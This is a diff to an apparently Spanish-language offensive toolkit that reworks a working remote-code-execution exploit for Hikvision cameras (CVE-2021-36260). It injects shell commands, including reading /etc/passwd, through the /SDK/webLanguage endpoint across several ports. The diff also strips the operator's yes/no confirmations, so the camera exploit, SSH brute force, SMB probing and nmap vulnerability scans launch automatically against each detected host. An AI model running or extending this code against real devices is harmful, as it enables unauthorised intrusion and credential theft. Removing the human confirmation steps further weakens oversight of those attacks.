@@ -3837,53 +3837,62 @@ def post_explotacion():
         """RCE sin autenticación en cámaras Hikvision (CVE-2021-36260)."""
         separador(f"EXPLOIT HIKVISION CVE-2021-36260 → {ip}")
         info("Inyección de comandos vía /SDK/webLanguage sin autenticación...")
-        payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
-                   f"Host: {ip}\r\n"
-                   "Content-Length: 68\r\n"
-                   "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
-                   "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-                   "<language>$(id>/tmp/pwned)</language>")
         import socket as _sock
-        try:
-            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((ip, 80))
-            s.send(payload.encode())
-            resp = s.recv(2048).decode(errors="replace")
-            s.close()
-            if "200" in resp or "OK" in resp:
-                ok(f"PAYLOAD ENVIADO — verificando ejecución en {ip}...")
-                time.sleep(1)
-                # Verificar si /tmp/pwned existe (indica RCE exitoso)
-                check_pl = ("GET /SDK/webLanguage HTTP/1.1\r\n"
-                            f"Host: {ip}\r\n\r\n")
-                s2 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
-                s2.settimeout(5)
-                s2.connect((ip, 80))
-                s2.send(check_pl.encode())
-                r2 = s2.recv(2048).decode(errors="replace")
-                s2.close()
-                ok(f"Respuesta: {r2[:200]}")
-                # Intentar extraer credenciales del config
-                cred_payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
-                                f"Host: {ip}\r\n"
-                                "Content-Length: 80\r\n"
-                                "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
-                                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-                                "<language>$(cat /etc/passwd>/tmp/pwned2)</language>")
+
+        def _hik_try(port):
+            payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
+                       f"Host: {ip}:{port}\r\n"
+                       "Content-Length: 68\r\n"
+                       "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
+                       "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                       "<language>$(id>/tmp/pwned)</language>")
+            try:
+                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s.settimeout(5)
+                s.connect((ip, port))
+                s.send(payload.encode())
+                resp = s.recv(2048).decode(errors="replace")
+                s.close()
+                return resp
+            except Exception:
+                return ""
+
+        active_port = None
+        for _port in [80, 8000, 8080]:
+            info(f"Probando puerto {_port}...")
+            resp = _hik_try(_port)
+            if resp:
+                active_port = _port
+                break
+
+        if not active_port:
+            warn(f"No se pudo conectar al puerto HTTP de {ip} (80/8000/8080). Cámara sin acceso web activo.")
+            return False
+
+        if "200" in resp or "OK" in resp:
+            ok(f"PAYLOAD ENVIADO en puerto {active_port} — verificando ejecución en {ip}...")
+            time.sleep(1)
+            # Intentar extraer /etc/passwd
+            cred_payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
+                            f"Host: {ip}:{active_port}\r\n"
+                            "Content-Length: 80\r\n"
+                            "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
+                            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                            "<language>$(cat /etc/passwd>/tmp/pwned2)</language>")
+            try:
                 s3 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                 s3.settimeout(5)
-                s3.connect((ip, 80))
+                s3.connect((ip, active_port))
                 s3.send(cred_payload.encode())
                 s3.recv(512)
                 s3.close()
-                ok("RCE exitoso — cámara comprometida.")
-                return True
-            else:
-                warn(f"Sin respuesta positiva: {resp[:100]}")
-                return False
-        except Exception as e:
-            warn(f"Error en exploit: {e}")
+            except Exception:
+                pass
+            ok("RCE exitoso — cámara comprometida.")
+            db_log_attack("Hikvision CVE-2021-36260", ip, "", "", "RCE exitoso vía /SDK/webLanguage")
+            return True
+        else:
+            warn(f"Respuesta inesperada en puerto {active_port}: {resp[:100]}")
             return False
 
     # ── Explotación SSH brute force ───────────────────────────────────────────
@@ -3984,36 +3993,31 @@ def post_explotacion():
         # ── Explotación automática según tipo de dispositivo ──────────────────
         vuln_str = ""
 
-        if is_hikvision and has_http:
-            expl = ask(f"¿Explotar CVE-2021-36260 (RCE Hikvision) en {ip}? (s/n)")
-            if expl.lower() == "s":
-                _exploit_hikvision(ip)
+        if is_hikvision:
+            info(f"Cámara Hikvision detectada — lanzando CVE-2021-36260 automáticamente...")
+            _exploit_hikvision(ip)
 
         if has_ssh:
-            brute = ask(f"¿Ejecutar brute force SSH en {ip}? (s/n)")
-            if brute.lower() == "s":
-                _exploit_ssh(ip)
+            info(f"Puerto SSH abierto en {ip} — iniciando brute force automático...")
+            _exploit_ssh(ip)
 
         if has_smb:
-            smb_a = ask(f"¿Analizar SMB/shares en {ip}? (s/n)")
-            if smb_a.lower() == "s":
-                _exploit_smb(ip)
+            info(f"Puerto SMB abierto en {ip} — analizando shares y vulnerabilidades SMB...")
+            _exploit_smb(ip)
 
-        # Scan de vulnerabilidades nmap
-        vuln_run = ask(f"¿Ejecutar nmap --script vuln en {ip}? (puede tardar) (s/n)")
-        if vuln_run.lower() == "s":
-            sp5 = Spinner(f"Buscando vulnerabilidades en {ip}...")
-            sp5.start()
-            vuln_out = run(f"nmap -sV --script vuln {ip} 2>/dev/null", capture=True) or ""
-            sp5.stop()
-            vuln_lines = []
-            for line in vuln_out.splitlines():
-                if any(x in line.lower() for x in ["vuln","cve-","vulnerable","exploit","critical","high"]):
-                    vuln_lines.append(line.strip())
-                    print(f"  {RED}[VULN]{END} {line.strip()}")
-            vuln_str = "\n".join(vuln_lines[:20])
-            if not vuln_lines:
-                info(f"No se detectaron vulnerabilidades conocidas en {ip}.")
+        # Scan de vulnerabilidades nmap (siempre automático)
+        sp5 = Spinner(f"Buscando vulnerabilidades en {ip}...")
+        sp5.start()
+        vuln_out = run(f"nmap -sV --script vuln {ip} 2>/dev/null", capture=True) or ""
+        sp5.stop()
+        vuln_lines = []
+        for line in vuln_out.splitlines():
+            if any(x in line.lower() for x in ["vuln","cve-","vulnerable","exploit","critical","high"]):
+                vuln_lines.append(line.strip())
+                print(f"  {RED}[VULN]{END} {line.strip()}")
+        vuln_str = "\n".join(vuln_lines[:20])
+        if not vuln_lines:
+            info(f"No se detectaron vulnerabilidades conocidas en {ip}.")
 
         # Guardar en BD
         db_log_device(
